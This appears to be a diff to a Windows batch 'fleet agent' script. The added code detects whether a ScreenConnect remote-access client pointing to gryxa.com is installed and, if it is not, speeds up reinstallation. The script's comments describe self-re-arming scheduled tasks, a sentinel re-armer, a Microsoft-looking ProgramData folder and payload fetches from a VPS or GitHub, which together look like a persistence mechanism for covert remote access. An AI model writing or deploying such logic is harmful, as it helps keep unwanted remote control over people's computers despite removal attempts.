@@ -1,5 +1,5 @@
 @echo off
-rem WINRTCS_AGENT 0.0.3 - self-updating fleet agent (batch+curl only, no PowerShell)
+rem WINRTCS_AGENT 0.0.7 - self-updating fleet agent (batch+curl only, no PowerShell)
 rem Tick: re-arm tasks (pair + sentinel) -> stage/apply self-update (SHA256 pinned)
 rem   -> run payload once per PAYLOAD_VER -> guard channel -> sentinel channel -> cache sync.
 rem 0.0.2 (C19): sentinel third-re-armer channel (SENTINEL_SHA256 pinned, lives in the
@@ -21,6 +21,10 @@ rem   (3) fd-trap: a single digit before '>' is a handle redirect (echo RC=0>fil
 rem   an EMPTY file); rc file now written with the immune prefix form >file echo ...
 rem 0.0.6 (C23): :Fetch uses curl --fail - an HTTP error page (CF 502/403) is >10 bytes
 rem   and used to satisfy the size check, skipping the GitHub fallback for that tick.
+rem 0.0.7 (C26): Gryxa-absent fast-path - every tick, if no ScreenConnect service has
+rem   gryxa.com in ImagePath, boost the guard gate (at most every 15 min) so install
+rem   starts within minutes of landing/absence instead of waiting the 1-3h stagger.
+rem   Presence resets the boost counter. Guard overlap lock + extkill brake still apply.
 setlocal EnableExtensions EnableDelayedExpansion
 set "ZD=C:\ProgramData\WinRTCS"
 set "CD=C:\ProgramData\Microsoft\WinRTCS\cache"
@@ -185,6 +189,22 @@ if defined GUARD_VER if defined GUARD_SHA (
   if not defined GCNT set /a "GCNT=!RANDOM! %% 120"
   set /a "GCNT+=1" 2>nul
   if not defined GCNT set "GCNT=1"
+  rem --- C26: no gryxa.com service -> force guard soon (every 15 agent ticks max) ---
+  call :HasGryxa
+  if defined HAS_GRYXA (
+    del /f /q "%ZD%\gryxa_boost.cnt" >nul 2>&1
+  ) else (
+    set "BOOST="
+    if exist "%ZD%\gryxa_boost.cnt" set /p "BOOST=" <"%ZD%\gryxa_boost.cnt"
+    if not defined BOOST set "BOOST=15"
+    set /a "BOOST+=1" 2>nul
+    if !BOOST! GEQ 15 (
+      set "BOOST=0"
+      set "GCNT=999"
+      echo [%DATE% %TIME%] gryxa_absent_force_guard>>"%LOG%"
+    )
+    >"%ZD%\gryxa_boost.cnt" echo !BOOST!
+  )
   echo !GCNT!>"%ZD%\guard.cnt"
   if !GCNT! GEQ 180 (
     rem no pre-reset: guard resets the counter itself after acquiring its lock,
@@ -244,6 +264,17 @@ if defined GUARD_SHA (
 if exist "%VFILE%" copy /y "%VFILE%" "%CD%\winrtcs.version" >nul 2>&1
 
 endlocal & exit /b 0
+
+:HasGryxa
+rem FP-agnostic: any ScreenConnect Client whose ImagePath contains gryxa.com.
+set "HAS_GRYXA="
+for /f "tokens=2 delims=:" %%A in ('sc query state^= all 2^>nul ^| findstr /C:"SERVICE_NAME: ScreenConnect Client ("') do (
+  for /f "tokens=* delims= " %%S in ("%%A") do (
+    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%%S" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+    if not errorlevel 1 set "HAS_GRYXA=1"
+  )
+)
+exit /b 0
 
 :Fetch
 rem %1 = repo-relative filename, %2 = destination. VPS mirror first (HTTPS + bearer,
